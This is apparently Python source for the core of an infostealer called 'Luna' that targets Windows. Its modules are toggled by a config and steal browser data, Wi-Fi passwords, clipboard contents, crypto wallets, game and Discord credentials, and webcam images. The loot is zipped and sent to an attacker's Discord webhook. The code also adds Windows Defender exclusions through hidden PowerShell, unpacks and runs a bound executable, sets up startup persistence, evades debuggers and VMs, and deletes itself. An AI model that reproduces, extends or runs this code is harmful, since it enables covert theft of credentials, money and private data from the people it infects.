import concurrent.futures
import ctypes
import json
import os
import random
import requests
import subprocess
import sys
import zlib
from multiprocessing import cpu_count
from requests_toolbelt.multipart.encoder import MultipartEncoder
from zipfile import ZIP_DEFLATED, ZipFile
print("HELLO FROM ZE GRAB")

#global variables
temp = os.getenv("temp")
temp_path = os.path.join(temp, ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))
os.mkdir(temp_path)
localappdata = os.getenv("localappdata")
if not hasattr(sys, "_MEIPASS"):
    sys._MEIPASS = os.path.dirname(os.path.abspath(__file__))


def main(webhook: str):
    threads = []

    if __CONFIG__["fakeerror"]:
        threads.append(Fakeerror)
    if __CONFIG__["startup"]:
        threads.append(Startup)
    if __CONFIG__["defender"]:
        threads.append(Defender)
    if __CONFIG__["browser"]:
        threads.append(Browsers)
    if __CONFIG__["wifi"]:
        threads.append(Wifi)
    if __CONFIG__["common_files"]:
        threads.append(CommonFiles)
    if __CONFIG__["clipboard"]:
        threads.append(Clipboard)
    if __CONFIG__["webcam"]:
        threads.append(capture_images)
    if __CONFIG__["wallets"]:
        threads.append(steal_wallets)
    if __CONFIG__["games"]:
        threads.append(Games)


    with concurrent.futures.ThreadPoolExecutor(max_workers=cpu_count()) as executor:
        executor.map(lambda func: func(), threads)

    max_archive_size = 1024 * 1024 * 25
    current_archive_size = 0

    _zipfile = os.path.join(localappdata, f'Luna-Logged-{os.getlogin()}.zip')
    with ZipFile(_zipfile, "w", ZIP_DEFLATED) as zipped_file:
        for dirname, _, files in os.walk(temp_path):
            for filename in files:
                absname = os.path.join(dirname, filename)
                arcname = os.path.relpath(absname, temp_path)
                file_size = os.path.getsize(absname)
                if current_archive_size + file_size <= max_archive_size:
                    zipped_file.write(absname, arcname)
                    current_archive_size += file_size
                else:
                    break

    data = {
        "username": "Luna",
        "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
    }

    _file = f'{localappdata}\\Luna-Logged-{os.getlogin()}.zip'

    if __CONFIG__["ping"]:
        if __CONFIG__["pingtype"] in ["Everyone", "Here"]:
            content = f"@{__CONFIG__['pingtype'].lower()}"
            data.update({"content": content})

    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "common_files", "clipboard", "webcam", "wallets", "games"]):
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Luna-Logged-{os.getlogin()}.zip', file, 'application/zip')})
            requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)
    else:
        requests.post(webhook, json=data)

    if __CONFIG__["systeminfo"]:
        PcInfo()

    if __CONFIG__["discord"]:
        Discord()

    os.remove(_file)


def Luna(webhook: str):
    def GetSelf() -> tuple[str, bool]:
        if hasattr(sys, "frozen"):
            return (sys.argv[0], True)
        else:
            return (__file__, False)    

    def ExcludeFromDefender(path) -> None: # Tries to exclude a file or folder from defender's scan
        if __CONFIG__["defender"]:
            subprocess.Popen("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(path), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
        
    def IsConnectedToInternet() -> bool: # Checks if the user is connected to internet
        try:
            return requests.get("https://gstatic.com/generate_204").status_code == 204
        except Exception:
            return False
    if not IsConnectedToInternet():
        if not __CONFIG__["startup"]:
            os._exit(0)

    def CreateMutex(mutex: str) -> bool:
        kernel32 = ctypes.windll.kernel32
        mutex = kernel32.CreateMutexA(None, False, mutex)
        return kernel32.GetLastError() != 183
    if not CreateMutex(__CONFIG__["mutex"]):
        os._exit(0)
        

    path, isExecutable = GetSelf()
    inStartup = os.path.basename(os.path.dirname(path)).lower() == "startup"
    if isExecutable and (__CONFIG__["bound_startup"] or not inStartup) and os.path.isfile(boundFileSrc:= os.path.join(sys._MEIPASS, "bound.serp")):
        if os.path.isfile(boundFileDst:= os.path.join(os.getenv("temp"), "bound.exe")):
            os.remove(boundFileDst)
        with open(boundFileSrc, "rb") as f:
            content = f.read()
        decrypted = zlib.decompress(content[::-1])
        with open(boundFileDst, "wb") as f:
            f.write(decrypted)
        del content, decrypted
                  
        ExcludeFromDefender(boundFileDst)
        subprocess.Popen("start bound.exe", shell=True, cwd=os.path.dirname(boundFileDst), creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
        

    if __CONFIG__["anti_spam"]:
        AntiSpam()

    if __CONFIG__["antidebug_vm"]:
        Debug()

    with concurrent.futures.ThreadPoolExecutor() as executor:
        if __CONFIG__["injection"]:
            executor.submit(Injection, webhook)
        executor.submit(main, webhook)

    if __CONFIG__["self_destruct"]:
        SelfDestruct()



# Options get put here
